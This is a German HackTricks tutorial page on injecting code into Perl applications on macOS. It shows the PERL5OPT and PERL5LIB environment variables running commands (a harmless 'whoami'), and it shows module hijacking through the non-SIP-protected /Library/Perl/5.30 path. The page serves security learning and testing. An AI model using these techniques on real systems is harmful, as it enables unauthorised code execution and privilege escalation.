# macOS Perl-Anwendungen Injection

{% hint style="success" %}
Lernen Sie und üben Sie AWS-Hacking: <img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Lernen Sie und üben Sie GCP-Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterstützen Sie HackTricks</summary>

* Überprüfen Sie die [**Abonnementpläne**](https://github.com/sponsors/carlospolop)!
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Github-Repositories senden.

</details>
{% endhint %}

## Über `PERL5OPT` & `PERL5LIB` Umgebungsvariable

Mit der Umgebungsvariable PERL5OPT ist es möglich, Perl dazu zu bringen, beliebige Befehle auszuführen.\
Erstellen Sie beispielsweise dieses Skript:

{% code title="test.pl" %}
```perl
#!/usr/bin/perl
print "Hello from the Perl script!\n";
```
{% endcode %}

Jetzt **exportieren Sie die Umgebungsvariable** und führen Sie das **Perl**-Skript aus:
```bash
export PERL5OPT='-Mwarnings;system("whoami")'
perl test.pl # This will execute "whoami"
```
Eine weitere Option besteht darin, ein Perl-Modul zu erstellen (z. B. `/tmp/pmod.pm`):

{% code title="/tmp/pmod.pm" %}
```perl
#!/usr/bin/perl
package pmod;
system('whoami');
1; # Modules must return a true value
```
{% endcode %}

Und verwenden Sie dann die Umgebungsvariablen:
```bash
PERL5LIB=/tmp/ PERL5OPT=-Mpmod
```
## Über Abhängigkeiten

Es ist möglich, die Abhängigkeiten des Perl-Laufs in der Reihenfolge des Ordners aufzulisten:
```bash
perl -e 'print join("\n", @INC)'
```
Was etwas zurückgeben wird, wie:
```bash
/Library/Perl/5.30/darwin-thread-multi-2level
/Library/Perl/5.30
/Network/Library/Perl/5.30/darwin-thread-multi-2level
/Network/Library/Perl/5.30
/Library/Perl/Updates/5.30.3
/System/Library/Perl/5.30/darwin-thread-multi-2level
/System/Library/Perl/5.30
/System/Library/Perl/Extras/5.30/darwin-thread-multi-2level
/System/Library/Perl/Extras/5.30
```
Einige der zurückgegebenen Ordner existieren nicht einmal, jedoch existiert **`/Library/Perl/5.30`**, es ist **nicht** durch **SIP** geschützt und es befindet sich **vor** den von SIP geschützten Ordnern. Daher könnte jemand diesen Ordner missbrauchen, um Skriptabhängigkeiten hinzuzufügen, damit ein Perl-Skript mit hohen Berechtigungen es lädt.

{% hint style="warning" %}
Beachten Sie jedoch, dass Sie **Root-Rechte benötigen, um in diesen Ordner zu schreiben**, und heutzutage erhalten Sie diese **TCC-Aufforderung**:
{% endhint %}

<figure><img src="../../../.gitbook/assets/image (28).png" alt="" width="244"><figcaption></figcaption></figure>

Zum Beispiel, wenn ein Skript **`use File::Basename;`** importiert, wäre es möglich, `/Library/Perl/5.30/File/Basename.pm` zu erstellen, um beliebigen Code auszuführen.

## Referenzen

* [https://www.youtube.com/watch?v=zxZesAN-TEk](https://www.youtube.com/watch?v=zxZesAN-TEk)

{% hint style="success" %}
Lernen Sie & üben Sie AWS-Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Lernen Sie & üben Sie GCP-Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterstützen Sie HackTricks</summary>

* Überprüfen Sie die [**Abonnementpläne**](https://github.com/sponsors/carlospolop)!
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories einreichen.

</details>
{% endhint %}
